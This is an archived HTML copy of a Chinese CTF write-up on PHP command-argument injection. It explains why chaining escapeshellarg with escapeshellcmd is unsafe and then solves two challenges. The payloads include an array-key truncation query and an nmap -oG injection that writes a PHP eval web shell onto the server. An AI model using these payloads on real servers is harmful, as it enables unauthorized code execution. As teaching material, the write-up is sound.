@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>CTF|PHP中的命令参数注入</title>
+</head>
+<body>
+<p><a href="https://zhuanlan.zhihu.com/p/103535020">原文</a></p>
+<div class="title-image"><img src="https://pic3.zhimg.com/v2-f5a67a5940ae10db7b96646c354ca864_b.jpg" alt=""></div><p>直奔主题，首先来了解两个 PHP 函数的定义。</p><h2>命令参数注入</h2><p><b>escapeshellarg</b></p><p>把字符串转码为可以在 shell 命令里使用的参数。</p><p><b>escapeshellcmd</b></p><p>对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。</p><p>看上去似乎没什么毛病，escapeshellarg 与 escapeshellcmd 两个函数都是 php 设置来转义非法字符的，不过由于它们俩的转义规则有所不同，当先使用 escapeshellarg 再使用 escapeshellcmd 时，就可能导致命令参数注入。这是为什么呢？</p><h2>原理解析</h2><figure data-size="small"><noscript><img src="https://pic1.zhimg.com/v2-4580f92a59787458d0cacb764075d91c_b.jpg" data-caption="" data-size="small" data-rawwidth="969" data-rawheight="322" class="origin_image zh-lightbox-thumb" width="969" data-original="https://pic1.zhimg.com/v2-4580f92a59787458d0cacb764075d91c_r.jpg"/></noscript><img src="https://pic1.zhimg.com/v2-4580f92a59787458d0cacb764075d91c_b.jpg" data-caption="" data-size="small" data-rawwidth="969" data-rawheight="322" class="origin_image zh-lightbox-thumb lazy" width="969" data-original="https://pic1.zhimg.com/v2-4580f92a59787458d0cacb764075d91c_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-4580f92a59787458d0cacb764075d91c_b.jpg"/></figure><p>test.php</p><figure data-size="small"><noscript><img src="https://pic4.zhimg.com/v2-e9797961ae8ba3c453c460061c79819b_b.jpg" data-caption="" data-size="small" data-rawwidth="969" data-rawheight="316" class="origin_image zh-lightbox-thumb" width="969" data-original="https://pic4.zhimg.com/v2-e9797961ae8ba3c453c460061c79819b_r.jpg"/></noscript><img src="https://pic4.zhimg.com/v2-e9797961ae8ba3c453c460061c79819b_b.jpg" data-caption="" data-size="small" data-rawwidth="969" data-rawheight="316" class="origin_image zh-lightbox-thumb lazy" width="969" data-original="https://pic4.zhimg.com/v2-e9797961ae8ba3c453c460061c79819b_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-e9797961ae8ba3c453c460061c79819b_b.jpg"/></figure><p>执行的语句将变成</p><div class="highlight"><pre><code class="language-text">curl &#39;127.0.0.1&#39;\\&#39;&#39; -v -d a=1\&#39;</code></pre></div><p>相当于</p><div class="highlight"><pre><code class="language-text">curl 127.0.0.1\ -v -d a=1&#39;</code></pre></div><p>从而实现参数注入</p><h2>题目分析</h2><p>下面就以几道 CTF 题作为补充的讲解。</p><p><b>题目1：[0 =&gt; 0] === [0x100000000 =&gt; 0]</b></p><div class="highlight"><pre><code class="language-text">&lt;?php
+$user = [&#39;admin&#39;, &#39;xxoo&#39;];
+if(empty($_GET[&#39;user&#39;]))  die(show_souce(__FILE__));
+if($_GET[&#39;user&#39;] === $user &amp;&amp; $_GET[&#39;user&#39;][0] != &#39;admin&#39;){
+    echo $flag;
+} else {
+    die(&#39;sketch_pl4ne_wants_a_girlfriend.&#39;);
+}
+?&gt;</code></pre></div><p><b>分析</b></p><p>这个实际上考的是索引数组的整数键截断</p><p>也就是：<a href="https://link.zhihu.com/?target=https%3A//bugs.php.net/bug.php%3Fid%3D69892" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://</span><span class="visible">bugs.php.net/bug.php?</span><span class="invisible">id=69892</span><span class="ellipsis"></span></a></p><figure data-size="small"><noscript><img src="https://pic1.zhimg.com/v2-815750c0770b845d9d408636dcc289c0_b.jpg" data-caption="" data-size="small" data-rawwidth="1024" data-rawheight="447" class="origin_image zh-lightbox-thumb" width="1024" data-original="https://pic1.zhimg.com/v2-815750c0770b845d9d408636dcc289c0_r.jpg"/></noscript><img src="https://pic1.zhimg.com/v2-815750c0770b845d9d408636dcc289c0_b.jpg" data-caption="" data-size="small" data-rawwidth="1024" data-rawheight="447" class="origin_image zh-lightbox-thumb lazy" width="1024" data-original="https://pic1.zhimg.com/v2-815750c0770b845d9d408636dcc289c0_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-815750c0770b845d9d408636dcc289c0_b.jpg"/></figure><div class="highlight"><pre><code class="language-text">var_dump([0 =&gt; 0] === [0x100000000 =&gt; 0]); // bool(true)</code></pre></div><p>构造 payload</p><div class="highlight"><pre><code class="language-text">?user[4294967296]=admin&amp;user[1]=xxoo
+//0x100000000 == 4294967296</code></pre></div><blockquote>该漏洞仅在 64 位的 php 中有效<br/>如何判断 32 位还是 64 位？<br/>查看 phpinfo() 即可知道。</blockquote><p><b>题目2：BUUCTF_2018_Online Tool</b></p><div class="highlight"><pre><code class="language-text">&lt;?php
+
+if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) {
+    $_SERVER[&#39;REMOTE_ADDR&#39;] = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];
+}
+
+if(!isset($_GET[&#39;host&#39;])) {
+    highlight_file(__FILE__);
+} else {
+    $host = $_GET[&#39;host&#39;];
+    $host = escapeshellarg($host);
+    $host = escapeshellcmd($host);
+    $sandbox = md5(&#34;glzjin&#34;. $_SERVER[&#39;REMOTE_ADDR&#39;]);
+    echo &#39;you are in sandbox &#39;.$sandbox;
+    @mkdir($sandbox);
+    chdir($sandbox);
+    echo system(&#34;nmap -T5 -sT -Pn --host-timeout 2 -F &#34;.$host);
+}</code></pre></div><p><b>分析</b></p><p>直接代码审计吧，remote_addr 和 x_forwarded_for 这两个是服务器获取 ip 用的。</p><div class="highlight"><pre><code class="language-text">$host = escapeshellarg($host);
+$host = escapeshellcmd($host);</code></pre></div><p>前面说了，这两个 PHP 函数一起使用，会导致漏洞。</p><p>再后面 echo system(&#34;nmap -T5 -sT -Pn --host-timeout 2 -F &#34;.$host);</p><p>有个 system 来执行命令，而且有传参，这里应该就是突破口了。</p><p>nmap 可以做些什么呢？查阅相关资料后，发现一个 namp 参数 -oG 可以实现将命令和结果写到文件。</p><p>so，写入上传文件，直接一句话走起吧。</p><div class="highlight"><pre><code class="language-text">?host=&#39; &lt;?php @eval($_POST[&#34;hack&#34;]);?&gt; -oG hack.php &#39;</code></pre></div><p>执行后会返回文件夹名</p><figure data-size="normal"><noscript><img src="https://pic3.zhimg.com/v2-a60d5becec07e10b1568ada97ccdc23e_b.jpg" data-caption="" data-size="normal" data-rawwidth="2872" data-rawheight="112" class="origin_image zh-lightbox-thumb" width="2872" data-original="https://pic3.zhimg.com/v2-a60d5becec07e10b1568ada97ccdc23e_r.jpg"/></noscript><img src="https://pic3.zhimg.com/v2-a60d5becec07e10b1568ada97ccdc23e_b.jpg" data-caption="" data-size="normal" data-rawwidth="2872" data-rawheight="112" class="origin_image zh-lightbox-thumb lazy" width="2872" data-original="https://pic3.zhimg.com/v2-a60d5becec07e10b1568ada97ccdc23e_r.jpg" data-actualsrc="https://pic3.zhimg.com/v2-a60d5becec07e10b1568ada97ccdc23e_b.jpg"/></figure><p>连接一句话即可得到 flag。</p><blockquote>参考：<a href="https://link.zhihu.com/?target=https%3A//bugs.php.net/bug.php%3Fid%3D69892" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://</span><span class="visible">bugs.php.net/bug.php?</span><span class="invisible">id=69892</span><span class="ellipsis"></span></a><br/><a href="https://link.zhihu.com/?target=https%3A//www.php.net/manual/zh/function.escapeshellcmd.php" class=" external" target="_blank" rel="nofollow noreferrer"><span class="invisible">https://www.</span><span class="visible">php.net/manual/zh/funct</span><span class="invisible">ion.escapeshellcmd.php</span><span class="ellipsis"></span></a></blockquote><p><a href="https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a" class=" wrap external" target="_blank" rel="nofollow noreferrer">二向箔安全</a>的网络安全技能包又更新了！学 Python 的也能当黑客了，多实战沉浸式体验，让你回味无穷。</p><p>这个春节，让你从 <b>程序猿→黑客x程序员 PLUS</b>！</p><figure data-size="normal"><noscript><img src="https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_b.jpg" data-caption="" data-size="normal" data-rawwidth="3058" data-rawheight="1720" class="origin_image zh-lightbox-thumb" width="3058" data-original="https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_r.jpg"/></noscript><img src="https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_b.jpg" data-caption="" data-size="normal" data-rawwidth="3058" data-rawheight="1720" class="origin_image zh-lightbox-thumb lazy" width="3058" data-original="https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_r.jpg" data-actualsrc="https://pic1.zhimg.com/v2-718b79371d6ca42244a942f02f2b537c_b.jpg"/></figure><p>更多有关渗透测试的内容请前往<a href="https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a" class=" wrap external" target="_blank" rel="nofollow noreferrer">二向箔安全</a>进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 <b>twosecurity02</b></p><figure data-size="normal"><noscript><img src="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg" data-caption="" data-size="normal" data-rawwidth="3041" data-rawheight="2000" class="origin_image zh-lightbox-thumb" width="3041" data-original="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg"/></noscript><img src="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg" data-caption="" data-size="normal" data-rawwidth="3041" data-rawheight="2000" class="origin_image zh-lightbox-thumb lazy" width="3041" data-original="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg" data-actualsrc="https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg"/></figure><p></p>
+<script async defer="defer" src="https://www.googletagmanager.com/gtag/js?id=UA-7909075-5"></script>
+<script>
+window.dataLayer = window.dataLayer || [];
+function gtag(){ dataLayer.push(arguments); }
+gtag('js', new Date());
+gtag('config', 'UA-7909075-5');
+</script>
+<script>
+var _hmt = _hmt || [];
+</script>
+<script async defer="defer" src="https://hm.baidu.com/hm.js?e3d40295e416616ddc21287da9646d31"></script>
+</body>
+</html>
